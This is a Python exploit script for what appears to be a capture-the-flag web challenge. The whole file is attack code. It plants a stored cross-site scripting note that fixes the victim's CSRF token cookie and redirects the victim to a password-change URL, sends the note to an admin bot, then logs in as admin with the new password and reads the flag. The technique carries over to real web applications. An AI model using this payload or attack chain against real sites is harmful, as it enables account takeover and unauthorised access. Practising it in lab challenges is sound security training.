import requests
import sys

APP = "http://app.ctf.local"
API = "http://api.ctf.local"
BOT = "http://localhost:8888"

ATTACKER = "pwner1337"
ATTACKER_PASS = "hunter2"

def main():
    s = requests.Session()

    # step 1 — register attacker account
    print("[+] registering attacker account")
    r = s.post(APP + "/register", data={"username": ATTACKER, "password": ATTACKER_PASS})
    if "username taken" in r.text:
        # already exists, just login
        r = s.post(APP + "/login", data={"username": ATTACKER, "password": ATTACKER_PASS})

    # grab csrf token from cookies
    csrf_token = s.cookies.get("csrf_token")
    print("[+] got csrf token:", csrf_token)

    # step 2 — create exploit note
    exploit = f"""<img src="{API}/cookie/set?name=csrf_token&value={csrf_token}">
<script>
setTimeout(function() {{
  window.location = "{APP}/change-password?password=pwned123&csrf_token={csrf_token}";
}}, 1500);
</script>"""

    print("[+] creating exploit note")
    r = s.post(APP + "/create", data={
        "title": "check this out",
        "content": exploit
    })
    if "redirect" not in r.text.lower() and r.status_code != 302:
        print("[-] failed to create note:", r.text[:200])
        sys.exit(1)

    # get note id from dashboard
    r = s.get(APP + "/dashboard")
    # find the note link
    import re
    m = re.search(r'/notes/(\d+)', r.text)
    if not m:
        print("[-] could not find note id")
        sys.exit(1)
    note_id = m.group(1)
    exploit_url = f"{APP}/notes/{note_id}"
    print("[+] exploit note at:", exploit_url)

    # step 3 — send to admin bot
    print("[+] sending to admin bot")
    r = requests.post(BOT + "/report", data={"url": exploit_url})
    print("[+] bot response:", r.text)

    # step 4 — wait then login as admin
    import time
    print("[+] waiting 5s for attack to complete...")
    time.sleep(5)

    print("[+] logging in as admin with new password")
    s2 = requests.Session()
    r = s2.post(APP + "/login", data={"username": "admin", "password": "pwned123"})
    if "wrong" in r.text.lower():
        print("[-] password change might have failed, trying anyways...")
    else:
        print("[+] logged in as admin!")

    # step 5 — get flag
    r = s2.get(APP + "/flag")
    print("[+] flag:", r.text.strip())

if __name__ == "__main__":
    main()
